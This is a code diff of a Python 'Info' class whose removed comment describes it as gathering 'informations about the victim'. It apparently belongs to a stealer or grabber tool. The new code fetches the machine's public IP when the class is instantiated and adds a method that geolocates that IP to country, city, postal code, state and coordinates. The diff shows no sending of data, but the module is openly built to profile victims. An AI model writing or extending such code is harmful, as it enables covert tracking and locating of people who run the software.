@@ -1,15 +1,25 @@
-# Class that contains all ways to get informations about the victim 
+from json import loads
+
 from urllib.request import Request, urlopen
 
 class Info():
     def __init__(self):
-        pass
-    
+        self.ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
+        
     def get_ip(self):
-        ip = "None"
-        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
-        return ip
-    
-    #Gonna be updated soon
-    
-    
+        return self.ip
+        
+    def global_info(self):
+        ipdatanojson = (urlopen(Request(
+            f"https://geolocation-db.com/jsonp/{self.ip}")).read().decode().replace(
+                "callback(", "").replace("})", "}"))
+        ipdata = loads(ipdatanojson)
+        obj = {
+            "Country": ipdata["country_name"],
+            "City": ipdata["city"],
+            "Postal": ipdata["postal"],
+            "Latitude": ipdata["latitude"],
+            "Longitude": ipdata["longitude"],
+            "State": ipdata["state"]
+        }
+        return obj
